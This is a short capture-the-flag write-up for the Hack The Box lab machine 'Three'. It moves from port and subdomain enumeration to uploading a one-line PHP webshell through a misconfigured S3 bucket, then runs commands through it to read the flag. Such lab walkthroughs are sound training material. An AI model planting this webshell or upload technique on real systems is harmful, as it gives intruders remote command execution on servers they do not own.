HTB - Three

Operating System: Linux
Tags: TBD

Information Gathering

First I started with a basic Nmap scan to identify open ports and services. This scan revealed SSH on port 22 and Apache on port 80.

$ nmap -sV -sC 10.129.14.145

Vulnerability Assessment

I started by visiting the web server and checked the home page for possible footholds. Not much was available, but I did notice their contact section referenced thetoppers.htb. I went to my etc/hosts/ file and added the hostname to my list

After confirming the home page had nothing, I ran gobuster to look for hidden directories and subdomains. s3.thetoppers.htb was a hit, and I added it to my hosts file as well.

$ gobuster vhost -w Wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain

I visited the s3 subdomain and found what looked to be an active AWS S3 bucket.

Exploitation

Using the CLI, I ran aws to interact directly with the S3 bucket. I set the endpoint at s3.thetoppers.htb and listed all the contents it had.

$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

Post-Exploitation

With access to the S3 bucket, I created a PHP webshell and uploaded it to thetoppers.htb. From there, I visited the website and verified it worked by running whoami

$ echo <?php system($_GET["cmd"]); ?> > shell.php
$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
http://thetoppers.htb/shell.php?cmd=whoami

I used the webshell to search the host machine and find the flag.

http://thetoppers.htb/shell.php?cmd=cd+..;cat+flag.txt
